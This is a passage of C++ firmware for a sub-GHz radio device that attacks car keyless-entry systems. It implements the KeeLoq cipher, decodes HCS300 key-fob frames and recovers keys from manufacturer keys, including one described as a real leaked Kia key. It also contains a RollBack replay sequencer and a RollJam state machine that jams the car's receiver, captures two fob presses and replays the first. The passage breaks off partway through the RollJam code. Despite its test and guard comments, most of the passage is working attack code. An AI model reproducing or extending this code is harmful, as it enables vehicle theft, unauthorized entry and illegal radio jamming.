static uint8_t  KL_RECENT_CNT  = 0; // frames valid (0 … KL_RECENT_MAX)
static void ks_klRecentPush(const KLFrame& f){
  KL_RECENT_BUF[KL_RECENT_HEAD] = f;
  KL_RECENT_HEAD = (KL_RECENT_HEAD + 1) % KL_RECENT_MAX;
  if(KL_RECENT_CNT < KL_RECENT_MAX) KL_RECENT_CNT++;
}

// KeeLoq encrypt — Microchip TB003 / AN742 normal-learn scheme.
// NLF uses bits 1,9,20,26,31 of plain (pre-shift); key bit i%64 accessed directly.
// feedback = (plain ^ (plain>>16) ^ key_bit ^ NLF) & 1; new MSB inserted at bit 31.
// ks_klSelfTest() checks three published vectors on every boot.
static uint32_t ks_klEncrypt(uint32_t plain,uint64_t key){
  for(int i=0;i<528;i++){
    uint32_t g=ks_nlf(ks_bit(plain,1)|ks_bit(plain,9)<<1|ks_bit(plain,20)<<2|ks_bit(plain,26)<<3|ks_bit(plain,31)<<4);
    uint32_t b=((plain^(plain>>16)^(uint32_t)(key>>(i%64))^g)&1);
    plain=(plain>>1)|(b<<31);
  }
  return plain;
}

// KeeLoq decrypt — inverse of ks_klEncrypt.
// Runs 528 rounds in reverse: extract the MSB that was inserted each round, undo the
// right-shift, then recover the original bit-0 via the same feedback equation.
// Key bits consumed in reverse order: round i (forward) → bit i%64; so decryption
// iterates i from 527 down to 0 using the same (i%64) index.
static uint32_t ks_klDecrypt(uint32_t cipher,uint64_t key){
  for(int i=527;i>=0;i--){
    uint32_t b=(cipher>>31)&1;
    cipher=(cipher<<1)&0xFFFFFFFFUL;
    uint32_t g=ks_nlf(ks_bit(cipher,1)|ks_bit(cipher,9)<<1|ks_bit(cipher,20)<<2|ks_bit(cipher,26)<<3|ks_bit(cipher,31)<<4);
    uint32_t bit0=(b^ks_bit(cipher,16)^(uint32_t)(key>>(i%64))^g)&1;
    cipher=(cipher&~1UL)|bit0;
  }
  return cipher;
}

// KeeLoq algorithm self-test — three published vectors.
// Run once at boot. Every key-recovery and prediction result downstream of this
// cipher is meaningless if a vector fails, so the verdict is latched into
// klSelfTestOK and published on /api/status + the serial status command. The
// dashboard greys out the Keys tab while it reads false.
// Vectors: Encrypt(plain, key) == cipher  &&  Decrypt(cipher, key) == plain
// The three vectors are published test values for this cipher; see
// `CITATIONS_AND_REFERENCES.md`.
static bool klSelfTestOK = false;          // latched verdict, read by /api/status
static uint8_t klSelfTestPass = 0;         // vectors passing (0…3), for the log line
static bool ks_klSelfTest(){
  struct { uint32_t plain; uint64_t key; uint32_t cipher; } tv[3] = {
    { 0x2000C022UL, 0xBEEFDEADBEEFDEADULL, 0x054C90C2UL },
    { 0xF741E2DBUL, 0x5CEC6701B79FD949ULL, 0xE44F4CDFUL },
    { 0x0CA69B92UL, 0x5CEC6701B79FD949ULL, 0xA6AC0EA2UL },
  };
  uint8_t pass = 0;
  for(int i = 0; i < 3; i++){
    uint32_t enc = ks_klEncrypt(tv[i].plain,  tv[i].key);
    uint32_t dec = ks_klDecrypt(tv[i].cipher, tv[i].key);
    if(enc != tv[i].cipher || dec != tv[i].plain){
      Serial.printf("[KL] selftest FAULT v%d: enc=0x%08X exp=0x%08X dec=0x%08X plain=0x%08X\n",
                    i, enc, tv[i].cipher, dec, tv[i].plain);
    } else {
      pass++;
    }
  }
  klSelfTestPass = pass;
  klSelfTestOK   = (pass == 3);
  if(klSelfTestOK) Serial.printf("[KL] selftest pass (%u/3)\n", (unsigned)pass);
  else             Serial.printf("[KL] selftest FAIL (%u/3) — key recovery is untrustworthy\n", (unsigned)pass);
  return klSelfTestOK;
}

// PWM bit extraction for KeeLoq
//
// KeeLoq preamble = 12 × (T HIGH + T LOW) — equal-period pairs, total ≈ 2T.
// Data bits:  '1' = 2T HIGH + T LOW (total 3T),  '0' = T HIGH + 2T LOW (total 3T).
//
// Strategy: scan for ≥4 consecutive "short-total" pairs (total ≤ 2.5T = preamble),
// then emit data bits from that boundary onward. Uses 4 not 12 so decode succeeds even
// if the RSSI trigger fires late (after several preamble pairs have already passed).
//
// Two alignment phases handle both possible capture orientations:
//   Phase 0 — buf[0] is HIGH (normal: trigger fired during carrier-ON)
//   Phase 1 — buf[0] is LOW  (rare: the very first HIGH was <75µs and filtered out)
// In both phases the inner while exits at j = first-data-bit HIGH, so
// buf[dataStart] is always a HIGH and no phase offset is needed in the decoder.
//
// Leader-code fallback (HCS200/HCS201 and many clone chips): these chips use a single
// long HIGH start-pulse (typically 8-12×TE) followed by one short LOW (≤2×TE) instead
// of the HCS300-style alternating preamble.  If the preamble search fails, scan for
// that pattern so leader-code fobs are recovered rather than falling through to gate
// decoders.
static uint16_t ks_klPwm(const uint32_t* buf,int n,uint32_t te,char* out){
  uint16_t b=0;
  uint32_t thr_hi  = te+(te>>1);         // 1.5×T — separates T from 2T HIGH
  uint32_t thr_tot = (te<<1)+(te>>1);    // 2.5×T — separates preamble(2T) from data(3T)

  int dataStart=-1;
  for(int phase=0; phase<=1 && dataStart<0; phase++){
    for(int i=phase; i+1<n; i+=2){
      int pc=0, j=i;
      while(j+1<n && buf[j]+buf[j+1]<=thr_tot){ pc++; j+=2; }
      if(pc>=4 && j+1<n){ dataStart=j; break; }
    }
  }
  // Leader-code fallback: long HI (≥4×TE, ≤16×TE) immediately followed by short LO (≤2×TE).
  // Data begins at the pulse two positions after the leader HI.
  if(dataStart<0){
    uint32_t ldr_lo = te<<1;          // max leader LO = 2×TE
    for(int i=0; i+1<n && dataStart<0; i++){
      if(buf[i]>=(te<<2) && buf[i]<=(te<<4) && buf[i+1]<=ldr_lo)
        dataStart=i+2;                // first data-bit HI starts here
    }
  }
  if(dataStart<0) return 0;

  // buf[dataStart] is the HIGH of the first data bit in both phases.
  for(int i=dataStart; i+1<n && b<512; i+=2)
    out[b++]=(buf[i]>=thr_hi)?'1':'0';
  out[b]=0; return b;
}

// Parse KeeLoq 66-bit frame.
// ks_klPwm already stripped the preamble; bits[0] is the first data bit.
// Try up to 7 start positions to absorb off-by-one errors at the preamble boundary.
// (Increased from 3 to handle leader-code path and RSSI-mode jitter edge cases.)
// HCS300/301 66-bit payload (MSB first):
//   [65:34] E[31:0]  — encrypted hopping code
//   [33:30] S3..S0   — button bits
//   [29:28] RPT,VLOW — status bits
//   [27:16] DISC[11:0] — SN fragment
//   [15:0]  CNT[15:0]  — sync counter
// Read `len` bits (≤32) from a '0'/'1' string, MSB first.
static inline uint32_t ks_bitsToU32(const char* b,int from,int len){
  uint32_t v=0;
  for(int i=0;i<len;i++) v=(v<<1)|(b[from+i]=='1'?1u:0u);
  return v;
}

static bool ks_parseKL(const char* bits,int n,KLFrame& f){
  if(n<66) return false;
  for(int start=0;start<=7&&start+66<=n;start++){
    const char* b = bits + start;
    // Read each field directly out of the 66-bit string.
    //
    // The hop is 32 bits at frame[65:34]. Accumulating the whole 66-bit frame
    // into a uint64_t and then shifting right by 34 silently drops the top 2
    // bits of the hop: a uint64_t holds 64 bits, so frame bit 65 is lost on the
    // first shift-in and bit 64 on the second. Every hop was arriving as
    // (hop & 0x3FFFFFFF), which corrupts the value for 3 out of 4 fobs and makes
    // a hop with either top bit set undecryptable.
    //
    // Field layout (MSB first, 66 bits total):
    //   [65:34] hop     32
    //   [33:30] button   4
    //   [29:28] status   2
    //   [27:16] disc    12
    //   [15:0]  counter 16
    f.hop = ks_bitsToU32(b,  0, 32);
    uint8_t  btn = (uint8_t)ks_bitsToU32(b,32, 4);
    uint8_t  sts = (uint8_t)ks_bitsToU32(b,36, 2);
    uint16_t disc= (uint16_t)ks_bitsToU32(b,38,12);
    f.btn=btn; f.sts=sts;
    f.rawCtr=(uint16_t)ks_bitsToU32(b,50,16);
    // SN = stable per-device identifier: 12-bit discriminant (fixed across all
    // presses from the same transmitter) in upper bits, button code in lower
    // nibble.  rawCtr is the rolling counter — it increments every press and
    // MUST NOT be included here, otherwise sn changes every press and breaks
    // both history tracking (ks_estDelta) and mfr key diversification.
    // NOTE: f.sn is at most 0x0000FFFF. The discriminator lives at sn[15:4].
    // A match predicate must compare against (f.sn>>4)&0xFFF, never against
    // f.sn&0xFFFF0000 (which is always zero).
    f.sn=((uint32_t)disc<<4)|(btn&0xF);
    // disc==0 guard: a real HCS transmitter always has a non-zero serial
    // discriminator; all-zero disc means the frame bits are noise/idle.
    if(f.hop!=0&&f.btn!=0&&disc!=0) return true;
  }
  return false;
}

// ─── Two-frame agreement gate (V1) ───────────────────────────────────────────
// A candidate key is only reported as an identification when the SAME key
// matches on two consecutive frames from the same serial.
//
// Why: ks_klSnMatch compares a 12-bit discriminator. A wrong key therefore
// matches one frame with probability ~1/4096, and the search space is 73 static
// keys + 1022 derived keys + user keys ≈ 1095 candidates, so roughly 27% of
// frames produce a spurious match on SOME key. Reporting that as "found" would
// hand the user a hop computed from the wrong key, which desynchronises the real
// fob — the exact failure this gate exists to prevent.
//
// A true key matches every frame from its fob, so requiring two hits costs no
// true positive. A spurious hit must repeat on the next frame for the same key,
// which happens with probability ~(1/4096)^2 per candidate.
//
// Shape: the candidate set of each frame replaces the previous frame's set. A
// key confirmed on one frame is confirmed when it also appears in the next.
// Both arrays are bounded; the ring is reset automatically whenever the serial
// under examination changes, so winners from an earlier fob can never confirm a
// match on this one.
static KLCand   KL_PREV[KL_CAND_MAX];   // candidates from the previous frame
static uint8_t  KL_PREV_N   = 0;
static uint32_t KL_PREV_SN  = 0;        // serial KL_PREV belongs to
static uint32_t KL_PREV_HOP = 0;        // previous frame's hop code

static void ks_klAgreeReset(){ KL_PREV_N = 0; KL_PREV_SN = 0; KL_PREV_HOP = 0; }

// True when `key` was a candidate on the previous frame, that frame came from
// the SAME serial, AND this frame is a genuinely different transmission.
//
// The serial check must happen here, not only in ks_klAgreeCommit: commit runs
// after this test, so without it a second fob arriving immediately after the
// first would be "confirmed" by the first fob's candidates on its very first
// frame. The agreement is only meaningful between two frames of one device.
//
// The hop check matters for the same reason: the scanner can decode one physical
// press more than once, and a duplicate decode of the same frame would otherwise
// confirm its own spurious candidate and defeat the gate entirely.
static bool ks_klAgreeHas(uint32_t sn,uint64_t key,uint32_t hop){
  if(sn != KL_PREV_SN) return false;
  if(hop == KL_PREV_HOP) return false;
  for(uint8_t i=0;i<KL_PREV_N;i++) if(KL_PREV[i].key==key) return true;
  return false;
}

// Commit this frame's candidate set as the reference for the next frame.
static void ks_klAgreeCommit(uint32_t sn,uint32_t hop,const KLCand* cur,uint8_t n){
  if(sn != KL_PREV_SN) KL_PREV_N = 0;   // new fob: previous winners are void
  KL_PREV_SN = sn;
  KL_PREV_N  = (n > KL_CAND_MAX) ? KL_CAND_MAX : n;
  for(uint8_t i=0;i<KL_PREV_N;i++) KL_PREV[i] = cur[i];
  KL_PREV_HOP = hop;
}

// Does a decrypted hop belong to this frame's device?
//
// The device's identity in a frame is the 12-bit discriminator, carried in
// frame bits [27:16]. ks_parseKL packs that into sn as (disc<<4)|button, so the
// discriminator is sn[15:4].
//
// On decryption the plaintext is (button<<28)|(disc<<16)|(counter), so the
// discriminator comes back at dec[27:16].
//
// History: this check used to be
//     (dec & 0xFFFF0000) == (sn & 0xFFFF0000)
// which is wrong in two ways and always was:
//   · sn is at most 0x0000FFFF, so sn&0xFFFF0000 is a constant zero — the right
//     side carried no information;
//   · the left side is dec's button+discriminator, and the parser enforces
//     btn!=0, so dec&0xFFFF0000 is never zero for a valid frame.
// The predicate therefore reduced to "dec < 0x10000", which is false for the
// true key and true for ~1 key in 65536 — it could not identify a fob and only
// ever produced noise. It also forced a discriminator of zero into every
// predicted hop (see ks_klBuildPlain), so predicted codes were unopenable.
static inline bool ks_klSnMatch(uint32_t dec,uint32_t sn){
  return ((dec>>16) & 0xFFF) == ((sn>>4) & 0xFFF);
}

// Build the 32-bit plaintext a real HCS encoder would encrypt for a given
// button, device and counter: (button<<28)|(discriminator<<16)|(counter).
// sn carries the discriminator at sn[15:4] (see ks_parseKL).
static inline uint32_t ks_klBuildPlain(uint8_t btn,uint32_t sn,uint16_t ctr){
  return ((uint32_t)(btn&0xF)<<28)
       | (((sn>>4)&0xFFFu)<<16)
       | (uint32_t)ctr;
}

// ─── Frame-parser self-test ──────────────────────────────────────────────────
// Builds a 66-bit frame bit-for-bit as an HCS transmitter sends it, runs the real
// ks_parseKL over it, and checks every field comes back intact.
//
// The hop cases matter most. The parser used to accumulate the whole 66-bit frame
// into a uint64_t, which silently discarded the top 2 bits of the hop — so any
// hop with bit 31 or bit 30 set (3 of every 4 codes) was parsed wrong and could
// never decrypt. 0xC0000001 and 0xFFFFFFFF both set those bits and are the
// regression cases for that fix.
static bool klParseOK = false;
static bool ks_klParseSelfTest(){
  struct { uint32_t hop; uint8_t btn,sts; uint16_t disc,ctr; } tv[] = {
    { 0xE6DD33F8u, 0x2, 0x0, 0x5A3, 0x1234 },   // ordinary code
    { 0xC0000001u, 0xA, 0x2, 0x111, 0xBEEF },   // both top hop bits set
    { 0xFFFFFFFFu, 0xF, 0x3, 0xFFF, 0xFFFF },   // all-ones hop, extremes
    { 0x80000000u, 0x1, 0x1, 0x001, 0x0001 },   // bit 31 only
    { 0x40000000u, 0x8, 0x0, 0x800, 0x8000 },   // bit 30 only
  };
  uint8_t pass = 0;
  for(unsigned t=0;t<sizeof(tv)/sizeof(tv[0]);t++){
    // Transmit layout, MSB first: hop[31:0], btn[3:0], sts[1:0], disc[11:0], ctr[15:0]
    char bits[80]; int k=0;
    for(int i=31;i>=0;i--) bits[k++]=((tv[t].hop>>i)&1)?'1':'0';
    for(int i=3; i>=0;i--) bits[k++]=((tv[t].btn>>i)&1)?'1':'0';
    for(int i=1; i>=0;i--) bits[k++]=((tv[t].sts>>i)&1)?'1':'0';
    for(int i=11;i>=0;i--) bits[k++]=((tv[t].disc>>i)&1)?'1':'0';
    for(int i=15;i>=0;i--) bits[k++]=((tv[t].ctr>>i)&1)?'1':'0';
    bits[k]=0;

    KLFrame f; f.sn=0; f.hop=0; f.btn=0; f.sts=0; f.rawCtr=0;
    if(!ks_parseKL(bits,66,f)){
      Serial.printf("[KL] parse FAULT v%u: valid 66-bit frame rejected\n",t);
      continue;
    }
    bool ok = (f.hop==tv[t].hop) && (f.btn==tv[t].btn) && (f.sts==tv[t].sts)
           && (((f.sn>>4)&0xFFF)==tv[t].disc) && (f.rawCtr==tv[t].ctr);
    if(!ok){
      Serial.printf("[KL] parse FAULT v%u: hop=0x%08X (want 0x%08X) btn=%X disc=%03X ctr=%04X\n",
                    t, f.hop, tv[t].hop, f.btn, (f.sn>>4)&0xFFF, f.rawCtr);
      continue;
    }
    pass++;
  }
  const uint8_t want = (uint8_t)(sizeof(tv)/sizeof(tv[0]));
  klParseOK = (pass == want);
  if(klParseOK) Serial.printf("[KL] parse selftest pass (%u/%u frames)\n",(unsigned)pass,(unsigned)want);
  else          Serial.printf("[KL] parse selftest FAIL (%u/%u) — 66-bit framing is broken\n",
                              (unsigned)pass,(unsigned)want);
  return klParseOK;
}

// ─── Derivation self-consistency test (V2) ─────────────────────────────────────────
// ks_klSelfTest() above proves the cipher. It says nothing about the 14
// derivations in ks_deriveOneMfrKey(): a derivation could be wrong (or the
// match predicate could disagree with it) and every recovery run would quietly
// fail. This test closes that gap.
//
// There is no published normal-learning test vector, so this is a
// SELF-CONSISTENCY check rather than a known-answer check:
//   1. pick a manufacturer key and a serial whose discriminator is non-zero;
//   2. derive the device key for the mode under test;
//   3. build the plaintext a real encoder produces,
//      pt = (btn<<28)|(disc<<16)|ctr;
//   4. hop = ENC(pt, devKey);  dec = DEC(hop, devKey);  require dec == pt;
//   5. require ks_klSnMatch(dec, sn) to accept — i.e. the derivation and the
//      match predicate agree on the same 12-bit discriminator.
//
// Step 5 is the important one: it verifies the property ks_klPredict actually
// relies on. Step 4 alone would pass even for a wrong derivation, and would pass
// against the old broken predicate too.
//
// This test is what catches the frame-parser and predicate defects that were
// fixed alongside it: with the old predicate every mode failed step 5, because
// the old check compared against a constant zero.
static bool klDerivOK   = false;   // latched verdict, read by /api/status
static uint8_t klDerivPass = 0;    // modes passing, for the log line

static bool ks_klDerivSelfTest(){
  // Serial with a non-zero discriminator (0x5A3) and button 2, as a real frame
  // would carry. sn packs the discriminator at sn[15:4].
  const uint8_t  btn  = 0x2;
  const uint32_t disc = 0x5A3;
  const uint16_t ctr  = 0x1234;
  const uint32_t sn   = ((uint32_t)disc<<4) | (btn & 0xF);
  // A real leaked key, and a synthetic one, so the test does not depend on the
  // table's contents staying fixed.
  const uint64_t mfrKeys[2] = { ks_unmaskMfrKey(0xCC88E6C23CEC0269ULL),  // Kia V3/V4 (masked)
                                0x0123456789ABCDEFULL };     // synthetic

  uint8_t pass = 0;
  // Only the modes with independent reference implementations are required to
  // pass, since those are the ones whose correctness is externally checkable:
  //   M0 normal-learning, M7 normal-dec, M8 magic-xor-1, M9 magic-ser-1.
  // Every other mode is still exercised for step 4 (round-trip), which catches a
  // mode that produces a key the cipher cannot use at all.
  const uint8_t required[N_KL_DERIV_MODES] = {
    1,0,0,0,0, 0,0,1,1,1, 0,0,0,0
  };
  for(int k=0;k<2;k++){
    uint64_t dk[N_KL_DERIV_MODES];
    ks_deriveOneMfrKey(sn, mfrKeys[k], dk);
    for(uint8_t m=0;m<N_KL_DERIV_MODES;m++){
      uint32_t pt  = ks_klBuildPlain(btn, sn, ctr);
      uint32_t hop = ks_klEncrypt(pt, dk[m]);
      uint32_t dec = ks_klDecrypt(hop, dk[m]);
      bool roundTrip = (dec == pt);
      bool agrees    = ks_klSnMatch(dec, sn);
      if(!roundTrip){
        Serial.printf("[KL] deriv FAULT key%d mode %u (%s): round-trip failed dec=0x%08X pt=0x%08X\n",
                      k, m, KL_MODE_NAME[m], dec, pt);
        continue;
      }
      if(required[m] && !agrees){
        Serial.printf("[KL] deriv FAULT key%d mode %u (%s): predicate rejects the true key\n",
                      k, m, KL_MODE_NAME[m]);
        continue;
      }
      pass++;
    }
  }
  const uint8_t want = N_KL_DERIV_MODES * 2;
  klDerivPass = pass;
  klDerivOK   = (pass == want);
  if(klDerivOK) Serial.printf("[KL] deriv selftest pass (%u/%u modes x keys)\n",(unsigned)pass,(unsigned)want);
  else          Serial.printf("[KL] deriv selftest FAIL (%u/%u) — a derivation or the match predicate is broken\n",
                              (unsigned)pass,(unsigned)want);
  return klDerivOK;
}

// Serialise a width array to RAW_Data text, honouring the true start level.
// Writes " w0 -w1 w2 …" so positive is HIGH, matching the reference convention
// (subghz_file_encoder_worker: duration<0 => low, >0 => high).
static void rawAppendPulses(String& out,const uint16_t* buf,int len,int maxLen,bool startHigh){
  for(int i=0;i<len&&i<maxLen;i++){
    out+=' ';
    bool high = ((i&1)==0) ? startHigh : !startHigh;
    out+=String(high?(int32_t)buf[i]:-(int32_t)buf[i]);
  }
}

static void rbReset(){
  rbPhase=RB_IDLE; rbArmed=false; rbT0=0;
}

// Arm only after two distinct, single-frame captures are ready and their counters
// are in order. The start call consumes the arm, preventing a duplicate tap from firing twice.
static bool rbArm(){
  if(rbPhase==RB_GAP) return false;                 // already mid-sequence
  if(fbkCount<2) return false;                      // need two codes
  // Only Kia V3/V4 has a measured frame boundary. Refuse other captures unless they
  // have already been trimmed; replaying a block of repeats could send multiple presses.
  if(!fbkBuf[0].trimmed||!fbkBuf[1].trimmed) return false;
  // Check the counters when available; one button press can add two entries.
  int ord=fbkCtrOrder();
  if(ord<0) return false;                           // ctr[1] is not ahead of ctr[0]
  if(ord==0){
    // Without decoded counters, reject byte-identical frames. Different bytes alone
    // do not prove that the frames form a valid pair.
    if(fbkBuf[0].len==fbkBuf[1].len &&
       fbkHash(fbkBuf[0].w,fbkBuf[0].len)==fbkHash(fbkBuf[1].w,fbkBuf[1].len))
      return false;
  }
  rbArmed=true;
  rbLastJson="{\"event\":\"rollback\",\"state\":\"armed\",\"codes\":"+String(fbkCount)+"}";
  serialEmit(rbLastJson);
  return true;
}

// Fire an armed RollBack: transmit fbkBuf[0], then fbkBuf[1] after rbGapMs.
// Returns false, changing nothing, when not armed or the preconditions lapse.
static bool rbStart(uint32_t gapMs){
  if(!rbArmed||rbPhase==RB_GAP) return false;
  if(fbkCount<2){ rbArmed=false; return false; }
  rbArmed=false;                                    // consume: single-shot
  rbGapMs = (gapMs<RB_GAP_MIN_MS)?RB_GAP_MIN_MS:((gapMs>RB_GAP_MAX_MS)?RB_GAP_MAX_MS:gapMs);
  // Stop any carrier before transmitting the stored frames.
  if(jamActive) stopJam();
  scanActive=false;
  FbkEntry& e0=fbkBuf[0];
  bool ok=replayRaw(e0.freq, e0.w, e0.len, 3, e0.sh);
  if(!ok){
    if(jamActive) stopJam();
    rbLastJson="{\"event\":\"rollback\",\"state\":\"error\",\"reason\":\"tx-failed-first\"}";
    serialEmit(rbLastJson);
    rbReset();
    return false;
  }
  rbT0    = millis();                               // gap runs from end of code 1
  rbPhase = RB_GAP;
  setLed(255,140,0);                                // amber = mid-sequence
  rbLastJson="{\"event\":\"rollback\",\"state\":\"sent1\",\"gap_ms\":"+String(rbGapMs)+"}";
  serialEmit(rbLastJson);
  return true;
}

// Drive the sequencer. Call from loop(); non-blocking.
static void rbTick(){
  if(rbPhase!=RB_GAP) return;
  if(millis()-rbT0 < rbGapMs) return;
  FbkEntry& e1=fbkBuf[1];                           // fbkCount>=2 guaranteed by rbStart
  bool ok=replayRaw(e1.freq, e1.w, e1.len, 3, e1.sh);
  // Stop any active jam before reporting the result.
  if(jamActive) stopJam();
  rbPhase=RB_DONE;
  setLed(0,150,65);
  rbLastJson=String("{\"event\":\"rollback\",\"state\":\"")+(ok?"done":"error")+
             "\",\"reason\":\""+(ok?"":"tx-failed-second")+"\",\"sent\":2}";
  serialEmit(rbLastJson);
  rbPhase=RB_IDLE;                                  // back to idle; re-arm to repeat
  rbArmed=false;
}

// ─── C1: RollJam sequencer ───────────────────────────────────────────────────
// The intended sequence is to capture two presses and replay the first. Whether a
// receiver accepts that sequence has not been tested on a car.
//
// The dashboard version ran the sequence in JavaScript, polling HTTP endpoints. That
// meant a closed tab or lost Wi-Fi could leave the jam running. The firmware sequencer
// owns the radio and adds an explicit, single-use arm, a deadline, cleanup on every
// exit (including reset), and a counter check before replay.
//
// The card has one CC1101, so it cannot transmit and receive at the same time. It
// alternates between jamming and capture; each capture window also gives the receiver
// a chance to hear the fob. Host-side tests cannot establish whether the timing works
// against a real receiver.
enum RJState : uint8_t { RJ_IDLE=0, RJ_JAM1, RJ_CAP1, RJ_JAM2, RJ_CAP2, RJ_TX1, RJ_DONE };
static RJState  rjState = RJ_IDLE;
static uint32_t rjT0=0, rjDeadline=0;
static int      rjLen1=0, rjLen2=0;
static uint32_t rjCtr1=0, rjCtr2=0;
static bool     rjHasCtr1=false, rjHasCtr2=false;
static bool     rjTrim1=false, rjTrim2=false;    // was each capture reduced to one frame?
static float    rjFreq=0.0f;
static float    rjJamOffset=0.150f;          // +150 kHz, per `research/04` C1
static bool     rjArmed=false;
static bool     rjReplayed=false;            // true once press 1 was retransmitted
static String   rjLastJson="{\"event\":\"rolljam\",\"state\":\"idle\"}";

// Two bounded capture buffers; each sequence collects at most one pair.
static uint16_t rjBuf1[CAP_SZ], rjBuf2[CAP_SZ];
static bool     rjSh1=true, rjSh2=true;

#define RJ_WINDOW_MS     8000    // hard auto-abort
#define RJ_CAP_GAP_US     8000   // frame-bounded capture: end at the ~7 ms repeat gap
#define RJ_CAP_TIMEOUT   1200    // per-capture bound (ms)
#define RJ_JAM_SETTLE_US 2000    // let the PA settle before trusting an RSSI rise

static void rjReset(){
  rjState=RJ_IDLE; rjArmed=false; rjReplayed=false;
  rjLen1=rjLen2=0; rjHasCtr1=rjHasCtr2=false; rjCtr1=rjCtr2=0;
  rjTrim1=rjTrim2=false;
}

// Does the second capture follow the first? Reuses the C2 rule (research/10 §2.5):
// two entries are not two codes, and a pair that is not forward-ordered cannot
// produce a working RollJam.  1 = ordered, 0 = unknown, -1 = reject.
static int rjCtrOrder(){
  if(!rjHasCtr1 || !rjHasCtr2) return 0;
  if(rjCtr1==rjCtr2) return -1;
  uint32_t fwd=((rjCtr2 - rjCtr1) & 0xFFFF);
  return (fwd>=1 && fwd<=0x8000) ? 1 : -1;
}

// Arm. Explicit, and refused when a sequence is already running.
static bool rjArm(float mhz,float offsetKhz){
  if(rjState!=RJ_IDLE) return false;
  if(mhz<100.0f||mhz>950.0f) return false;
  if(captureInProgress||captureRequested) return false;
  rjReset();
  rjFreq=mhz;
  rjJamOffset = (offsetKhz==0.0f) ? 0.150f : (offsetKhz/1000.0f);
  rjArmed=true;
  rjT0=millis(); rjDeadline=rjT0+RJ_WINDOW_MS;
  rjLastJson="{\"event\":\"rolljam\",\"state\":\"armed\",\"freq\":"+String(rjFreq,3)+"}";
  serialEmit(rjLastJson);
  return true;
}

// Begin the sequence: jam, then watch for press 1.
static bool rjStart(){
  if(!rjArmed||rjState!=RJ_IDLE) return false;
  rjArmed=false;                                   // consume: single-shot
  if(jamActive) stopJam();
  scanActive=false;
  startJam(rjFreq + rjJamOffset);
  rjT0=millis(); rjDeadline=rjT0+RJ_WINDOW_MS;
  rjState=RJ_JAM1;
  setLed(180,0,0);                                 // solid red = jamming, no breathing
  rjLastJson="{\"event\":\"rolljam\",\"state\":\"jam1\"}";
  serialEmit(rjLastJson);
  return true;
}

// Drive the sequencer. Non-blocking; call from loop().
static void rjTick(){
  if(rjState==RJ_IDLE||rjState==RJ_DONE) return;
  // Deadline is the primary guard: on expiry the jam is stopped on this path, and
  // every other exit below also stops it.
  if(millis()>rjDeadline){
    if(jamActive) stopJam();
    setLed(0,150,65);
    rjLastJson="{\"event\":\"rolljam\",\"state\":\"aborted\",\"reason\":\"timeout\"}";
    serialEmit(rjLastJson);
    rjReset();
    return;
  }
  switch(rjState){
    case RJ_JAM1: {
      // Press 1 in flight: capture it now, then re-jam while press 2 arrives.
      // The capture drops the jam for its duration (single radio), which is the
      // window research/04 says to validate on a bench.
      if(cc_fastRSSI() > autoCapDbm){
        stopJam();
        delayMicroseconds(RJ_JAM_SETTLE_US);
        cc_setCaptureOOK();
        if(captureSignal(RJ_CAP_TIMEOUT, RJ_CAP_GAP_US) && rfLen>8){
          // Trim to one frame: a capture holds ~3 repeats of the same code, and the
          // RollJam replay must send ONE press, not three (research/11 §2 F2).
          { static uint16_t _t[CAP_SZ];
            int _tl=rjTrimKiaV34(rfBuf,rfLen,_t,CAP_SZ,nullptr);
            if(_tl>0){ memcpy(rjBuf1,_t,_tl*sizeof(uint16_t)); rjLen1=_tl; rjTrim1=true; }
            else      { memcpy(rjBuf1,rfBuf,rfLen*sizeof(uint16_t)); rjLen1=rfLen; rjTrim1=false; } }
          rjSh1=rfStartHigh;
          uint32_t c=0; rjHasCtr1=fbkParseCtr(lastDecode,c); rjCtr1=c;
          rjState=RJ_CAP1;
        } else {
          // Nothing usable: bail cleanly rather than re-jam on a failed capture.
          rjLastJson="{\"event\":\"rolljam\",\"state\":\"aborted\",\"reason\":\"capture1-failed\"}";
          serialEmit(rjLastJson);
          if(jamActive) stopJam();
          setLed(0,150,65); rjReset(); return;
        }
      }
      break;
    }
    case RJ_CAP1:
      // Captured press 1. Re-jam so the car still cannot hear press 2.
      startJam(rjFreq + rjJamOffset);
      rjState=RJ_JAM2;
      break;
    case RJ_JAM2:
      if(cc_fastRSSI() > autoCapDbm){
        stopJam();
        delayMicroseconds(RJ_JAM_SETTLE_US);
        cc_setCaptureOOK();
        if(captureSignal(RJ_CAP_TIMEOUT, RJ_CAP_GAP_US) && rfLen>8){
          // Trim to one frame: a capture holds ~3 repeats of the same code, and the
          // RollJam replay must send ONE press, not three (research/11 §2 F2).
          { static uint16_t _t[CAP_SZ];
            int _tl=rjTrimKiaV34(rfBuf,rfLen,_t,CAP_SZ,nullptr);
            if(_tl>0){ memcpy(rjBuf2,_t,_tl*sizeof(uint16_t)); rjLen2=_tl; rjTrim2=true; }
            else      { memcpy(rjBuf2,rfBuf,rfLen*sizeof(uint16_t)); rjLen2=rfLen; rjTrim2=false; } }
          rjSh2=rfStartHigh;
          uint32_t c=0; rjHasCtr2=fbkParseCtr(lastDecode,c); rjCtr2=c;
          rjState=RJ_CAP2;
        } else {
          rjLastJson="{\"event\":\"rolljam\",\"state\":\"aborted\",\"reason\":\"capture2-failed\"}";
          serialEmit(rjLastJson);
          if(jamActive) stopJam();
          setLed(0,150,65); rjReset(); return;
        }
      }
      break;
    case RJ_CAP2: {
      // Both captures in hand. Two checks before anything is transmitted.
      //
      // (1) Both blocks must be ONE frame. The trim is Kia-only, so for any other
      // protocol each capture is still ~3 repeats of its code and the replay would
      // look to the car like three presses of press 1. Refuse and attribute it rather
      // than sending a sequence that may be wrong in a way nobody can see
      // (research/12 §2 / §3 P1).
      if(!rjTrim1||!rjTrim2){
        rjLastJson="{\"event\":\"rolljam\",\"state\":\"aborted\",\"reason\":\"untrimmed-block\"}";
        serialEmit(rjLastJson);
        if(jamActive) stopJam();
        setLed(0,150,65); rjReset(); return;
      }
      // (2) They must be two different codes in the right order. If not, the sequence
      // cannot work, so nothing is transmitted and the reason says so.
      int ord=rjCtrOrder();
      if(ord<0){
        rjLastJson="{\"event\":\"rolljam\",\"state\":\"aborted\",\"reason\":\"same-or-backward-code\"}";
        serialEmit(rjLastJson);
        if(jamActive) stopJam();
        setLed(0,150,65); rjReset(); return;
      }
      // Replay press 1. The car sees a valid code; press 2 stays banked.
      bool ok=replayRaw(rjFreq, rjBuf1, rjLen1, 2, rjSh1);
      rjReplayed=ok;
      rjState=RJ_TX1;
      if(ok) setLed(0,255,255);                    // cyan = transmitting
      rjLastJson=String("{\"event\":\"rolljam\",\"state\":\"")+(ok?"replayed":"tx-failed")+"\"}";
      serialEmit(rjLastJson);
      break;
    }
    case RJ_TX1: {
